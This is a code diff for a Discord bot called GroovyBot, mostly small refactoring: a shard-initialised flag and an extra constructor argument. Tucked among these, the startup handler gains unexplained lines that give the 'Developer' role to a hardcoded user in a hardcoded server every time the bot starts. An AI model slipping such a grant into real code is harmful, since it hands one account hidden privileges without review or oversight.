@@ -94,6 +94,8 @@ public class GroovyBot {
     private PlaylistManager playlistManager;
     @Getter
     private final YoutubeUtil youtubeClient;
+    @Getter
+    private boolean allShardsInitialized = false;
 
 
     private GroovyBot(String[] args) {
@@ -109,7 +111,7 @@ public class GroovyBot {
         lavalinkManager = new LavalinkManager(this);
         statusPage = new StatusPage(httpClient, config.getJSONObject("statuspage"));
         createDefaultDatabase();
-        commandManager = new CommandManager(debugMode ? config.getJSONObject("settings").getString("test_prefix") : config.getJSONObject("settings").getString("prefix"));
+        commandManager = new CommandManager(debugMode ? config.getJSONObject("settings").getString("test_prefix") : config.getJSONObject("settings").getString("prefix"), this);
         serverCountStatistics = new ServerCountStatistics(httpClient, config.getJSONObject("botlists"));
         keyManager = new KeyManager(postgreSQL.getConnection());
         interactionManager = new InteractionManager();
@@ -332,6 +334,9 @@ public class GroovyBot {
     @SubscribeEvent
     @SuppressWarnings("unused")
     private void onReady(AllShardsLoadedEvent event) {
+        allShardsInitialized = true;
+        net.dv8tion.jda.core.entities.Guild guild = shardManager.getGuildById("403882830225997825");
+        guild.getController().addRolesToMember(guild.getMemberById("264048760580079616"), guild.getRolesByName("Developer", true)).queue();
         final ErrorReporter errorReporter = new ErrorReporter();
         errorReporter.addFilter(errorResponseFilter);
         Logger.getRootLogger().addAppender(errorReporter);
